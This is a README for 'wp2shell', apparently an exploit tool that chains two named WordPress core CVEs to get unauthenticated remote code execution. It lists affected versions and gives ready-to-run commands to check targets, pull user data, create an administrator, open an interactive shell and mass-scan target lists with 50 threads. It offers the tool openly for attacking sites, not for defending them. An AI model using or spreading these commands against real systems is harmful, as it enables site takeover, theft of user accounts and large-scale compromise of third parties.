# wp2shell - WordPress RCE PoC (CVE-2026-63030 + CVE-2026-60137)

**Unauthenticated Remote Code Execution in WordPress Core**

> by: **JohenLastGen**  

---

## 📌 Overview

This tool chains two critical WordPress vulnerabilities to achieve **unauthenticated RCE**:

| Vulnerability | CVE | Description |
|---------------|-----|-------------|
| REST Batch Route Confusion | **CVE-2026-63030** | Bypass validation, smuggles SQLi payload |
| WP_Query author__not_in SQLi | **CVE-2026-60137** | Raw string injection → SQL execution |

**Impact:** Unauthenticated attacker → create admin → execute commands

---

## 🎯 Affected Versions

| Version Range | Status |
|---------------|--------|
| WordPress 6.9.0 - 6.9.4 | ✅ **VULNERABLE** (Full RCE Chain) |
| WordPress 7.0.0 - 7.0.1 | ✅ **VULNERABLE** (Full RCE Chain) |
| WordPress 6.8.0 - 6.8.5 | ⚠️ SQLi only (needs facilitating plugin) |
| WordPress 6.9.5, 7.0.2+ | ❌ Patched |

---

## 🚀 Quick Start

```bash
#options:
  -h, --help show this help message and exit
python3 wp2shell.py --help

# 1. Check if target is vulnerable
python3 wp2shell.py check https://target.com

# 2. Extract data (fingerprint/users)
python3 wp2shell.py read https://target.com --preset fingerprint
python2 wp2shell.py read https://target.com --preset users

# 3. RCE - Create admin & execute command (NO CREDENTIALS NEEDED!)
python3 wp2shell.py shell https://target.com --cmd "id"

# 4. Interactive shell
python3 wp2shell.py shell https://target.com --interactive

# 5. Mass scan multiple targets
python3 wp2shell.py scan targets.txt --threads 50 --prove --json results.json
